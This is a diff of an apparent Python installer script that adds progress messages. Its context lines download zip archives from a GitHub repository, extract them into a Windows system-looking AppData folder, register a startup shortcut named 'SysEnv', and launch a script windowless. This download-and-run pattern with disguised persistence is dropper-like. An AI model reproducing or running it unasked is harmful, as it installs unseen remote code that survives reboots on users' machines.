@@ -27,6 +27,8 @@ def install_packages():
 install_package()
 install_packages()
 
+print("All required packages have been installed.")
+
 time.sleep(3)
 
 import requests
@@ -36,19 +38,32 @@ user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 os.makedirs(target_path, exist_ok=True)
 
+print("Downloading skibidi...")
 r = requests.get("https://github.com/skibidi-123456/skibidi/archive/refs/heads/main.zip", allow_redirects=True)
+print("Download complete.")
+print("Writing skibidi...")
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-main.zip')
 open(file_path, 'wb').write(r.content)
+print("Writing complete.")
+print("Extracting skibidi...")
 with zipfile.ZipFile(file_path, 'r') as zip_ref:
     zip_ref.extractall(target_path)
 os.remove(file_path)
 
+print("Extracting complete.")
+print("Downloading skibidi-startup...")
 r = requests.get("https://github.com/skibidi-123456/skibidi/archive/refs/heads/startup.zip", allow_redirects=True)
+print("Download complete.")
+print("Writing skibidi-startup...")
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-startup.zip')
 open(file_path, 'wb').write(r.content)
+print("Writing complete.")
+print("Extracting skibidi-startup...")
 with zipfile.ZipFile(file_path, 'r') as zip_ref:
     zip_ref.extractall(target_path)
 os.remove(file_path)
+print("Extracting complete.")
+print("Creating shortcut...")
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
@@ -71,5 +86,7 @@ def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'sta
     shortcut.save()
 
 add_to_startup()
+print("Shortcut created.")
+print("Starting skibidi...")
 
 subprocess.Popen(["pythonw", os.path.join(target_path, "skibidi-startup", "startup.pyw")])
